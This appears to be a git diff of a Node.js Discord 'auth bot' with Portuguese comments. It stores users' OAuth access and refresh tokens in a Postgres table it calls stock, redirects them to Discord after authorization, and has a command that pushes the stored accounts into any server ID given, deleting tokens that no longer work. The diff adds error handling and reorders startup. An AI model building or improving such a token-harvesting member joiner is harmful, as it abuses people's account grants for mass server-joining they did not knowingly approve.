@@ -1,7 +1,7 @@
 require('dotenv').config();
 const express = require('express');
 const axios = require('axios');
-const { Pool } = require('pg'); // Biblioteca do Postgres
+const { Pool } = require('pg');
 const { 
     Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, 
     ButtonBuilder, ButtonStyle, PermissionsBitField, ActivityType 
@@ -11,27 +11,34 @@ const {
 const LOG_CHANNEL_ID = process.env.LOG_CHANNEL_ID; 
 const REDIRECT_TARGET = 'https://discord.com/app'; 
 
-// --- CONEXÃO POSTGRES (NEON.TECH) ---
+// --- SETUP DO BANCO (POSTGRES) ---
 let pool = null;
-if (process.env.DATABASE_URL) {
-    pool = new Pool({
-        connectionString: process.env.DATABASE_URL,
-        ssl: { rejectUnauthorized: false } // Necessário para Neon/Render
-    });
-    console.log('✅ Conectado ao PostgreSQL!');
-    
-    // Cria a tabela automaticamente se não existir
-    pool.query(`
-        CREATE TABLE IF NOT EXISTS auth_users (
-            id VARCHAR(255) PRIMARY KEY,
-            username VARCHAR(255),
-            access_token TEXT,
-            refresh_token TEXT,
-            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
-        );
-    `).catch(err => console.error("Erro ao criar tabela:", err));
-} else {
-    console.log('⚠️ DATABASE_URL não definida. Memória temporária.');
+
+// Função para iniciar o Banco ANTES do bot
+async function iniciarBanco() {
+    if (process.env.DATABASE_URL) {
+        pool = new Pool({
+            connectionString: process.env.DATABASE_URL,
+            ssl: { rejectUnauthorized: false }
+        });
+
+        try {
+            await pool.query(`
+                CREATE TABLE IF NOT EXISTS auth_users (
+                    id VARCHAR(255) PRIMARY KEY,
+                    username VARCHAR(255),
+                    access_token TEXT,
+                    refresh_token TEXT,
+                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+                );
+            `);
+            console.log('✅ Tabela "auth_users" verificada/criada com sucesso!');
+        } catch (err) {
+            console.error("❌ Erro fatal ao criar tabela:", err);
+        }
+    } else {
+        console.log('⚠️ DATABASE_URL não definida. Rodando em memória.');
+    }
 }
 
 const app = express();
@@ -41,8 +48,10 @@ const client = new Client({ intents: [GatewayIntentBits.Guilds] });
 app.get('/', async (req, res) => {
     let count = 0;
     if(pool) {
-        const result = await pool.query('SELECT COUNT(*) FROM auth_users');
-        count = result.rows[0].count;
+        try {
+            const result = await pool.query('SELECT COUNT(*) FROM auth_users');
+            count = result.rows[0].count;
+        } catch(e) { count = 0; } // Se der erro, diz que tem 0
     }
     res.send(`Auth Bot Postgres Online. Estoque: ${count}`);
 });
@@ -72,9 +81,8 @@ app.get('/callback', async (req, res) => {
 
         const user = userResponse.data;
 
-        // --- SALVA NO POSTGRES (SQL) ---
+        // Salva no Banco (Com proteção de erro)
         if (pool) {
-            // "Upsert": Se existe atualiza, se não existe cria.
             await pool.query(`
                 INSERT INTO auth_users (id, username, access_token, refresh_token)
                 VALUES ($1, $2, $3, $4)
@@ -111,11 +119,21 @@ app.get('/callback', async (req, res) => {
 
     } catch (e) { console.error(e); res.send('Erro auth.'); }
 });
-app.listen(process.env.PORT || 3000);
 
 // --- BOT ---
 client.once('ready', async () => {
     console.log(`🤖 Bot Postgres Logado: ${client.user.tag}`);
+    
+    // Só tenta ler o banco se ele existir
+    if (pool) {
+        try {
+            const res = await pool.query('SELECT COUNT(*) FROM auth_users');
+            const total = res.rows[0].count;
+            client.user.setActivity(`${total} usuários`, { type: ActivityType.Watching });
+        } catch (e) {
+            console.log("Banco ainda não pronto, pulando status inicial.");
+        }
+    }
     
     await client.application.commands.set([
         { name: 'setup_auth', description: 'Painel Auth' },
@@ -148,8 +166,12 @@ client.on('interactionCreate', async interaction => {
     if (interaction.commandName === 'estoque') {
         let count = 0;
         if(pool) {
-            const res = await pool.query('SELECT COUNT(*) FROM auth_users');
-            count = res.rows[0].count;
+            try {
+                const res = await pool.query('SELECT COUNT(*) FROM auth_users');
+                count = res.rows[0].count;
+            } catch(e) { 
+                return interaction.reply({ content: '❌ Erro ao ler banco de dados. Tente novamente.', ephemeral: true });
+            }
         }
         interaction.reply({ content: `📦 **Banco SQL:** ${count} usuários salvos.`, ephemeral: true });
     }
@@ -161,37 +183,44 @@ client.on('interactionCreate', async interaction => {
         const qtd = interaction.options.getInteger('quantidade');
         const serverId = interaction.options.getString('servidor_id');
         
-        // Pega usuários do BANCO
-        const res = await pool.query('SELECT * FROM auth_users LIMIT $1', [qtd]);
-        const users = res.rows;
-        
-        if (users.length === 0) return interaction.reply({ content: '❌ Banco vazio.', ephemeral: true });
+        try {
+            const res = await pool.query('SELECT * FROM auth_users LIMIT $1', [qtd]);
+            const users = res.rows;
+            
+            if (users.length === 0) return interaction.reply({ content: '❌ Banco vazio.', ephemeral: true });
 
-        await interaction.reply(`🚀 **Iniciando envio...**\nAlvo: \`${serverId}\`\nQtd: ${users.length}`);
+            await interaction.reply(`🚀 **Iniciando envio...**\nAlvo: \`${serverId}\`\nQtd: ${users.length}`);
 
-        let sucesso = 0;
-        let falha = 0;
+            let sucesso = 0;
+            let falha = 0;
 
-        for (const user of users) {
-            try {
-                await axios.put(
-                    `https://discord.com/api/guilds/${serverId}/members/${user.id}`,
-                    { access_token: user.access_token }, // Note o underline (banco salva com _)
-                    { headers: { Authorization: `Bot ${process.env.BOT_TOKEN}` } }
-                );
-                sucesso++;
-            } catch (error) {
-                // Se der erro 401 (Token inválido), deleta do banco
-                if (error.response && error.response.status === 401) {
-                    await pool.query('DELETE FROM auth_users WHERE id = $1', [user.id]);
+            for (const user of users) {
+                try {
+                    await axios.put(
+                        `https://discord.com/api/guilds/${serverId}/members/${user.id}`,
+                        { access_token: user.access_token },
+                        { headers: { Authorization: `Bot ${process.env.BOT_TOKEN}` } }
+                    );
+                    sucesso++;
+                } catch (error) {
+                    if (error.response && error.response.status === 401) {
+                        await pool.query('DELETE FROM auth_users WHERE id = $1', [user.id]);
+                    }
+                    falha++;
                 }
-                falha++;
+                await sleep(1000);
             }
-            await sleep(1000);
-        }
 
-        interaction.channel.send(`✅ **Finalizado!**\nSucesso: ${sucesso}\nFalha: ${falha}`);
+            interaction.channel.send(`✅ **Finalizado!**\nSucesso: ${sucesso}\nFalha: ${falha}`);
+        } catch (err) {
+            interaction.reply('Erro fatal ao buscar usuários no banco.');
+        }
     }
 });
 
-client.login(process.env.BOT_TOKEN);
+// --- INICIALIZAÇÃO SEGURA ---
+// Primeiro conecta no banco e cria a tabela, SÓ DEPOIS liga o servidor e o bot
+iniciarBanco().then(() => {
+    app.listen(process.env.PORT || 3000, () => console.log("Web Server Ligado"));
+    client.login(process.env.BOT_TOKEN);
+});
